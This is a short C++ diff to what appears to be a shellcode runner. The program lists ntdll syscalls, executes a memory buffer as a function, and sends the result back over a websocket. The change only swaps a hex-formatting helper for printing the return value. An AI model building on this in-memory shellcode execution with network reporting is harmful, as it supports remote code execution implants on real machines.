@@ -15,17 +15,6 @@ void printStringAsHex(const string& s) {
     cout << dec << '\n';
 }
 
-
-string bytesToHexString(const uint8_t bytes[8]) {
-    stringstream ss;
-
-    for (int i = 0; i < 8; ++i) {
-        ss << hex << setw(2) << setfill('0') << static_cast<int>(bytes[i]);
-    }
-
-    return ss.str();
-}
-
 int main() {
     vector<pair<string, DWORD>> syscalls = getNtdllSyscalls();
     string syscall_list = pairsToString(syscalls);
@@ -65,7 +54,9 @@ int main() {
         ShellcodeFunc exec = (ShellcodeFunc) mem;
         cout << "About to exec." << endl;
         unsigned long long retval = exec();
-        string returnstring = bytesToHexString((const uint8_t*)retval);
+        cout << "Exec complete." << endl;
+        string returnstring = to_string(retval);
+        cout << "return value 0x" << retval << endl;
         sendText(client.websocket, returnstring);
     }
 
